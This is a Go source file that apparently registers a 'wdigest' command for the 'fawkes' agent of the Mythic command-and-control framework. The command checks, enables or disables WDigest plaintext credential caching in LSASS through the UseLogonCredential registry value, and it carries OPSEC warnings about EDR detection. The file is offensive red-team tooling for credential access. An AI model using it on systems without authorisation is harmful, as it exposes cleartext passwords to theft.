package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func wdigestOPSECMessage(action string) string {
	msg := "OPSEC WARNING: "
	switch action {
	case "enable":
		msg += "Enabling WDigest writes UseLogonCredential=1 to HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest. This registry modification is a well-known credential access indicator and is monitored by most EDR/SIEM solutions."
	case "disable":
		msg += "Disabling WDigest writes UseLogonCredential=0. Registry modification to WDigest key may trigger endpoint alerts."
	default:
		msg += "Querying WDigest registry key status. Low risk — read-only registry access."
	}
	return msg
}

func wdigestStatusEnabled(responseText string) bool {
	return strings.Contains(responseText, "ENABLED")
}

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "wdigest",
		Description:         "Manage WDigest plaintext credential caching in LSASS. Enable to capture cleartext passwords at next interactive logon (Windows 10+ disables WDigest by default).",
		HelpString:          "wdigest -action <status|enable|disable>",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.001", "T1112"}, // LSASS Memory + Modify Registry
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"status", "enable", "disable"},
				DefaultValue:  "status",
				Description:   "Action: status (check current state), enable (cache plaintext creds), disable (stop caching)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "wdigest_new.js"), Author: "@galoryber"},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := wdigestOPSECMessage(action)
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: WDigest credentials extracted from LSASS memory. This requires LSASS process access which is heavily monitored by EDR (Sysmon Event ID 10). The UseLogonCredential registry value may have been modified to enable WDigest caching.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			switch action {
			case "enable":
				createArtifact(processResponse.TaskData.Task.ID, "Configuration Change",
					"WDigest plaintext credential caching enabled — credentials captured at next interactive logon")
			case "disable":
				createArtifact(processResponse.TaskData.Task.ID, "Configuration Change",
					"WDigest plaintext credential caching disabled")
			case "status":
				if wdigestStatusEnabled(responseText) {
					createArtifact(processResponse.TaskData.Task.ID, "Configuration Discovery",
						"WDigest UseLogonCredential is ENABLED — plaintext credentials may be in LSASS")
				}
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := action
			response.DisplayParams = &display
			if action == "enable" || action == "disable" {
				createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("WDigest UseLogonCredential registry modification — %s", action))
			}
			return response
		},
	})
}
